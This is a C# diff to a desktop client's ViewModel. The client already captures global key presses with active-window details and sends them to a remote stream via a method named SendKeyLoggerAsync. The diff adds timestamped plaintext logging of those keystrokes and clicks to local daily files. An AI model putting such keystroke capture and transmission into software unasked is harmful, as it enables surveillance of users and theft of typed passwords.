@@ -49,6 +49,8 @@ namespace CLIENT.ViewModels
             {
                 _synth.SpeakAsyncCancelAll();
                 _synth.SpeakAsync($"You pressed {key}");
+                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                AppendMessageToLogAsync($"[{timestamp}] : {key}");
             };
             KeyboardDetector.Start();
 
@@ -78,6 +80,8 @@ namespace CLIENT.ViewModels
                         {
                             string windowInfo = WindowDetector.GetActiveWindowInfo();
                             await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
+                            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                            AppendMessageToLogAsync($"[{timestamp}] : {key}, {windowInfo}");
                         };
                         await Dispatcher.UIThread.InvokeAsync(() =>
                         {
@@ -223,11 +227,13 @@ namespace CLIENT.ViewModels
         {
             _synth.SpeakAsyncCancelAll();
             _synth.SpeakAsync($"You clicked {appName}");
+            string message = $"Clicked: {appName}";
+            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+            AppendMessageToLogAsync($"[{timestamp}] : {message}");
             try
             {
                 if (_client != null && _client.Connected && _stream != null)
                 {
-                    string message = $"Clicked: {appName}";
                     byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                     await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
                     await Dispatcher.UIThread.InvokeAsync(() =>
@@ -333,6 +339,32 @@ namespace CLIENT.ViewModels
                 {
                     Greeting = "Send failed: " + ex.Message;
                 });
+            }
+        }
+        public void AppendMessageToLogAsync(string message)
+        {
+            try
+            {
+                // Get today's date string in yyyymmdd format
+                string dateStr = DateTime.Now.ToString("yyyyMMdd");
+
+                // Build file path (adjust folder as needed)
+                string logFileName = $"log-{dateStr}.txt";
+                string logFolder = "logs";  // e.g., a "logs" folder in your app directory
+                Directory.CreateDirectory(logFolder); // ensure folder exists
+
+                string logFilePath = Path.Combine(logFolder, logFileName);
+
+                // Prepare the line to write (timestamp + message)
+                string line = $"{message}{Environment.NewLine}";
+
+                File.AppendAllText(logFilePath, line);
+
+            }
+            catch (Exception ex)
+            {
+                // Handle exceptions as needed (log or show error)
+                Console.WriteLine($"Failed to write log: {ex.Message}");
             }
         }
 
